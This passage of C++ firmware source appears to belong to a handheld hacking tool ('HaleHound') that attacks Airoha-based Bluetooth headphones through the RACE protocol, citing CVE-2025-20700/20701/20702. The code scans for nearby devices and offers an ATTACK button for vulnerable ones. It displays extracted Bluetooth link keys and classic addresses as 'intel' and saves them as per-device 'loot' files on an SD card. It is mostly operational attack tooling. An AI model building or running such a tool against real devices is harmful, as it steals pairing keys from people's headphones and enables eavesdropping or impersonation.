            snprintf(logBuf, sizeof(logBuf), "%d keys extracted!", numDevices);
            arLogAdd(logBuf, numDevices > 0 ? 0x07E0 : HALEHOUND_GUNMETAL);
        } else {
            arLogAdd("Link keys: parse failed", HALEHOUND_GUNMETAL);
        }
    } else {
        arLogAdd("Link keys: no response", HALEHOUND_GUNMETAL);
    }
    arDrawAtkLog();

    // Done
    pArClient->disconnect();
    arLogAdd("=== INTEL COMPLETE ===", 0xF800);
    arDrawAtkLog();
    delay(1500);

    inAttack = false;
    inAttackResult = true;
    inResult = true;
    arReportPage = 0;
    arDrawReport();
}

// ═══════════════════════════════════════════════════════════════════════════
// REPORT DISPLAY (2-PAGE)
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawReport() {
    if (arProbeIdx < 0) return;
    RaceDevice& d = arDevs[arProbeIdx];

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    if (arReportPage == 0) {
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("RACE INTEL REPORT");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("1/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Target: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
        y += 12;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("BLE: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
        y += 12;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Type: ");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.print(d.isSonyVariant ? "Sony RACE" : "Airoha RACE");
        y += 16;

        if (arIntel.hasBrEdr) {
            tft.fillRoundRect(5, y, SCREEN_WIDTH - 10, 28, 3, HALEHOUND_DARK);
            tft.drawRoundRect(4, y - 1, SCREEN_WIDTH - 8, 30, 3, 0xF800);
            tft.setTextColor(0xF800);
            tft.setCursor(10, y + 3);
            tft.print("BR/EDR:");
            char brStr[20];
            snprintf(brStr, sizeof(brStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     arIntel.brEdrAddr[0], arIntel.brEdrAddr[1],
                     arIntel.brEdrAddr[2], arIntel.brEdrAddr[3],
                     arIntel.brEdrAddr[4], arIntel.brEdrAddr[5]);
            tft.setCursor(10, y + 15);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(brStr);
            y += 34;
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(5, y);
            tft.print("BR/EDR: Not extracted");
            y += 14;
        }

        y += 4;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("SDK: ");
        tft.setTextColor(arIntel.hasSdkVersion ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
        tft.print(arIntel.hasSdkVersion ? arIntel.sdkVersion : "Unknown");
        y += 12;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Build: ");
        tft.setTextColor(arIntel.hasBuildVersion ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
        tft.print(arIntel.hasBuildVersion ? arIntel.buildVersion : "Unknown");
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Link Keys: ");
        if (arIntel.hasLinkKeys) {
            tft.setTextColor(0x07E0);
            char keyStr[16];
            snprintf(keyStr, sizeof(keyStr), "%d extracted", arIntel.linkKeyCount);
            tft.print(keyStr);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("None");
        }
    } else {
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("RAW INTEL");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("2/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Link Key Data:");
        y += 12;

        if (arIntel.hasLinkKeys && arIntel.linkKeyLen > 0) {
            for (int row = 0; row < 6 && (size_t)(row * 8) < arIntel.linkKeyLen; row++) {
                char hexLine[42];
                int pos = 0;
                for (int i = row * 8; i < (row + 1) * 8 && (size_t)i < arIntel.linkKeyLen; i++) {
                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos, "%02X ", arIntel.linkKeyData[i]);
                }
                if (pos > 0) {
                    hexLine[pos] = '\0';
                    tft.setTextColor(HALEHOUND_HOTPINK);
                    tft.setCursor(10, y);
                    tft.print(hexLine);
                    y += 11;
                }
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("No key data captured");
            y += 11;
        }

        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("BD_ADDR (Classic):");
        y += 12;
        if (arIntel.hasBrEdr) {
            char brHex[42];
            int pos = 0;
            for (int i = 0; i < 6; i++) {
                pos += snprintf(brHex + pos, sizeof(brHex) - pos, "%02X ", arIntel.brEdrAddr[i]);
            }
            brHex[pos] = '\0';
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, y);
            tft.print(brHex);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("Not extracted");
        }
    }

    // Bottom nav bar
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);

    // SAVE button
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, HALEHOUND_DARK);
    tft.drawRoundRect(4, SCREEN_HEIGHT - 35, 72, 28, 4, HALEHOUND_MAGENTA);
    tft.drawBitmap(10, SCREEN_HEIGHT - 29, bitmap_icon_save, 16, 16, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(30, SCREEN_HEIGHT - 25);
    tft.print("SAVE");

    // Page nav
    tft.setTextColor(HALEHOUND_VIOLET);
    if (arReportPage == 0) {
        tft.setCursor(SCREEN_WIDTH - 55, SCREEN_HEIGHT - 25);
        tft.print("1/2");
        tft.drawBitmap(SCREEN_WIDTH - 22, SCREEN_HEIGHT - 29, bitmap_icon_RIGHT, 16, 16, HALEHOUND_VIOLET);
    } else {
        tft.drawBitmap(SCREEN_WIDTH - 60, SCREEN_HEIGHT - 29, bitmap_icon_LEFT, 16, 16, HALEHOUND_VIOLET);
        tft.setCursor(SCREEN_WIDTH - 38, SCREEN_HEIGHT - 25);
        tft.print("2/2");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SD CARD LOOT SAVE
// ═══════════════════════════════════════════════════════════════════════════

static void arSaveLoot() {
    if (arProbeIdx < 0) return;
    RaceDevice& d = arDevs[arProbeIdx];

    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, 0x07E0);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(15, SCREEN_HEIGHT - 25);
    tft.print("SAVING");

    if (pArClient) {
        if (pArClient->isConnected()) pArClient->disconnect();
        pArClient = nullptr;
    }
    pArTx = nullptr;
    pArRx = nullptr;
    if (pArScan) { pArScan->stop(); pArScan = nullptr; }
    BLEDevice::deinit(false);
    delay(100);

    spiDeselect();
    SPI.end();
    delay(10);
    SPI.begin(18, 19, 23);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    delay(10);

    if (!SD.begin(SD_CS, SPI, 4000000)) {
        SPI.end();
        delay(50);
        SPI.begin(18, 19, 23);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
            tft.setTextColor(0xF800);
            tft.setCursor(10, SCREEN_HEIGHT - 52);
            tft.print("SD card not found!");
            SD.end();
            return;
        }
    }

    if (!SD.exists("/race_loot")) SD.mkdir("/race_loot");

    char safeMac[18];
    strncpy(safeMac, d.addrStr, 17);
    safeMac[17] = '\0';
    for (int i = 0; i < 17; i++) {
        if (safeMac[i] == ':') safeMac[i] = '-';
    }

    char fname[48];
    snprintf(fname, sizeof(fname), "/race_loot/%s_%lu.txt", safeMac, millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
        tft.setTextColor(0xF800);
        tft.setCursor(10, SCREEN_HEIGHT - 52);
        tft.print("File write failed!");
        SD.end();
        return;
    }

    f.println("========================================");
    f.println("  AIROHA RACE INTEL REPORT");
    f.println("  CVE-2025-20700/20701/20702");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();
    f.printf("Target:  %s\n", d.name);
    f.printf("BLE MAC: %s\n", d.addrStr);
    f.printf("RSSI:    %d dBm\n", d.rssi);
    f.printf("Type:    %s\n", d.isSonyVariant ? "Sony RACE" : "Airoha RACE");
    f.println();

    if (arIntel.hasBrEdr) {
        f.printf("BR/EDR Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 arIntel.brEdrAddr[0], arIntel.brEdrAddr[1],
                 arIntel.brEdrAddr[2], arIntel.brEdrAddr[3],
                 arIntel.brEdrAddr[4], arIntel.brEdrAddr[5]);
    } else {
        f.println("BR/EDR Address: Not extracted");
    }
    f.println();

    f.printf("SDK Version: %s\n", arIntel.hasSdkVersion ? arIntel.sdkVersion : "Unknown");
    f.printf("Build Version: %s\n", arIntel.hasBuildVersion ? arIntel.buildVersion : "Unknown");
    f.println();

    f.println("-- Link Keys --");
    if (arIntel.hasLinkKeys && arIntel.linkKeyLen > 0) {
        f.printf("  Devices: %d\n", arIntel.linkKeyCount);
        size_t recordSize = 22;
        for (int k = 0; k < arIntel.linkKeyCount && (size_t)((k + 1) * recordSize) <= arIntel.linkKeyLen; k++) {
            uint8_t* rec = &arIntel.linkKeyData[k * recordSize];
            f.printf("  Device %d BD_ADDR: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     k + 1, rec[0], rec[1], rec[2], rec[3], rec[4], rec[5]);
            f.print("  Link Key: ");
            for (int b = 6; b < 22; b++) f.printf("%02X ", rec[b]);
            f.println();
        }
    } else {
        f.println("  No link keys extracted");
    }
    f.println();
    f.println("========================================");

    f.close();
    SD.end();

    tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
    tft.setTextColor(0x07E0);
    tft.setCursor(10, SCREEN_HEIGHT - 52);
    tft.print("Saved: ");
    char shortName[28];
    snprintf(shortName, sizeof(shortName), "/race_loot/%.18s", safeMac);
    tft.print(shortName);
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC INTERFACE
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (arInit) return;

    #if CYD_DEBUG
    Serial.println("[RACE] Airoha RACE initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    arDrawHeader();

    WiFi.mode(WIFI_OFF);
    delay(50);

    arReleaseClassicBt();
    BLEDevice::init("");
    delay(150);

    pArScan = BLEDevice::getScan();
    if (!pArScan) {
        Serial.println("[RACE] getScan() returned NULL");
        arExit = true;
        return;
    }

    pArScan->setActiveScan(true);
    pArScan->setInterval(100);
    pArScan->setWindow(99);

    arDevCount = 0;
    arCurIdx = 0;
    arListStart = 0;
    arProbeIdx = -1;
    arExit = false;
    inResult = false;
    inAttack = false;
    inAttackResult = false;
    pArClient = nullptr;
    pArTx = nullptr;
    pArRx = nullptr;
    arInit = true;

    arDoScan();
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[RACE] Init complete — %d BLE devices found\n", arDevCount);
    #endif
}

void loop() {
    if (!arInit) return;

    // Delegate to loot viewer when active
    if (inLootViewer) {
        WPLootViewer::loop();
        if (WPLootViewer::isExitRequested()) {
            WPLootViewer::cleanup();
            inLootViewer = false;
            waitForTouchRelease();
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            arDrawHeader();
            if (inAttackResult) {
                arDrawReport();
            } else if (inResult) {
                arDrawResult();
            } else {
                arDrawList();
            }
        }
        return;
    }

    touchButtonsUpdate();

    // ─── Icon Bar Touch ──────────────────────────────────────────
    static unsigned long lastTap = 0;
    if (millis() - lastTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    // Back icon
                    waitForTouchRelease();
                    if (inAttackResult) {
                        inAttackResult = false;
                        inResult = true;
                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        arDrawHeader();
                        arDrawResult();
                    } else if (inResult) {
                        inResult = false;
                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        arDrawHeader();
                        arDrawList();
                    } else {
                        arExit = true;
                    }
                    lastTap = millis();
                    return;
                }
                else if (tx >= 96 && tx < 144) {
                    // Loot viewer icon — browse /race_loot/ files
                    if (!inAttack) {
                        WPLootViewer::setDirectory("/race_loot");
                        inLootViewer = true;
                        WPLootViewer::setup();
                        lastTap = millis();
                        return;
                    }
                }
                else if (tx >= 210 && tx < 226) {
                    // Rescan icon
                    if (!inResult && !inAttackResult) {
                        arDoScan();
                    }
                    lastTap = millis();
                    return;
                }
            }
        }
    }

    // ─── Button Handling ─────────────────────────────────────────
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (inAttackResult) {
            inAttackResult = false;
            inResult = true;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            arDrawHeader();
            arDrawResult();
        } else if (inResult) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            arDrawHeader();
            arDrawList();
        } else {
            arExit = true;
        }
        return;
    }

    // ─── Device List ─────────────────────────────────────────────
    if (!inResult) {
        if (buttonPressed(BTN_UP)) {
            if (arCurIdx > 0) {
                arCurIdx--;
                if (arCurIdx < arListStart) arListStart--;
                arDrawList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (arCurIdx < arDevCount - 1) {
                arCurIdx++;
                if (arCurIdx >= arListStart + AR_MAX_VISIBLE) arListStart++;
                arDrawList();
            }
        }

        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
            if (arDevCount > 0) {
                arProbeDevice(arCurIdx);
            } else {
                arDoScan();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            arDoScan();
        }

        // Touch to select device
        int visCount = arDevCount - arListStart;
        if (visCount > AR_MAX_VISIBLE) visCount = AR_MAX_VISIBLE;
        int touched = getTouchedMenuItem(98, AR_LINE_HEIGHT, visCount);
        if (touched >= 0) {
            arCurIdx = arListStart + touched;
            arDrawList();
            arProbeDevice(arCurIdx);
        }

        // Touch bottom bar to rescan
        {
            uint16_t bx, by;
            if (getTouchPoint(&bx, &by) && by >= (uint16_t)(SCREEN_HEIGHT - 18)) {
                arDoScan();
            }
        }
    } else if (inAttackResult) {
        // SAVE — BTN_DOWN or BTN_SELECT (hardware button zones)
        if (buttonPressed(BTN_DOWN) || buttonPressed(BTN_SELECT)) {
            arSaveLoot();
            waitForTouchRelease();
        }

        // Page nav — buttons
        if (buttonPressed(BTN_RIGHT)) {
            if (arReportPage < 1) { arReportPage++; arDrawReport(); }
        }
        if (buttonPressed(BTN_LEFT)) {
            if (arReportPage > 0) { arReportPage--; arDrawReport(); }
        }

        // Touch zones for report screen buttons
        {
            uint16_t px, py;
            if (getTouchPoint(&px, &py)) {
                // SAVE button touch (x=5-75, bottom bar)
                if (px >= 5 && px <= 75 && py >= (uint16_t)(SCREEN_HEIGHT - 38)) {
                    waitForTouchRelease();
                    arSaveLoot();
                }
                // Page nav — right side
                else if (px >= 160 && py >= (uint16_t)(SCREEN_HEIGHT - 38)) {
                    arReportPage = (arReportPage == 0) ? 1 : 0;
                    waitForTouchRelease();
                    arDrawReport();
                }
            }
        }
    } else {
        // Probe result view
        if (buttonPressed(BTN_LEFT)) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            arDrawHeader();
            arDrawList();
        }

        // ATTACK button for vulnerable devices
        if (arProbeIdx >= 0 && arProbeIdx < arDevCount) {
            RaceDevice& rd = arDevs[arProbeIdx];
            if (rd.result == ARR_VULNERABLE) {
                if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
                    arRunAttack();
                    return;
                }
                uint16_t atx, aty;
                if (getTouchPoint(&atx, &aty)) {
                    if (atx >= 140 && atx <= 232 && aty >= (uint16_t)(SCREEN_HEIGHT - 35) && aty <= (uint16_t)(SCREEN_HEIGHT - 7)) {
                        waitForTouchRelease();
                        arRunAttack();
                        return;
                    }
                }
            }
        }
    }
}

bool isExitRequested() { return arExit; }

void cleanup() {
    if (pArClient) {
        if (pArClient->isConnected()) pArClient->disconnect();
        pArClient = nullptr;
    }
    pArTx = nullptr;
    pArRx = nullptr;
    if (pArScan) pArScan->stop();
    BLEDevice::deinit(false);

    if (inLootViewer) {
        WPLootViewer::cleanup();
        inLootViewer = false;
    }

    arInit = false;
    arExit = false;
    inResult = false;
    inAttack = false;
    inAttackResult = false;
    inLootViewer = false;
    arAtkLogCount = 0;
    arDevCount = 0;
    arProbeIdx = -1;

    #if CYD_DEBUG
    Serial.println("[RACE] Cleanup complete");
    #endif
}

}  // namespace AirohaRace
